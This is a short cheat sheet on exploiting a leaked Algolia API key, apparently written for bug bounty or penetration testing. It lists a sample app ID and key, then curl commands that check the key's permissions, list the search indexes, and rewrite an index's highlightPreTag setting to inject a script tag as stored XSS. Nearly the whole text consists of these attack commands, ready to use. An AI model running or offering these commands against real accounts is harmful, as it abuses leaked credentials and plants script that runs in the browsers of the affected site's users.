# Algolia API Key Exploitation

Sample format
- `<APP ID>` - 5EIAX9ASJ4
- `<API KEY>` - 3cdb5788ea20588c6e27f12e4dbbe733

Check Permission:
```sh
"https://<APP ID>-dsn.algolia.net/1/keys/<API KEY>?x-algolia-application-id=<APP ID>&x-algolia-api-key=<API KEY>"
```

List Indexes:
```sh
curl -s "https://<APP ID>-dsn.algolia.net/1/indexes/?query=" --header 'x-algolia-api-key: <API KEY>' --header 'x-algolia-application-id: <APP ID>'
```

Exploit Index (Add XSS):
```sh
curl --request PUT \
  --url https://<APP ID>-1.algolianet.com/1/indexes/<INDEX NAME>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <API KEY>' \
  --header 'x-algolia-application-id: <APP ID>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```
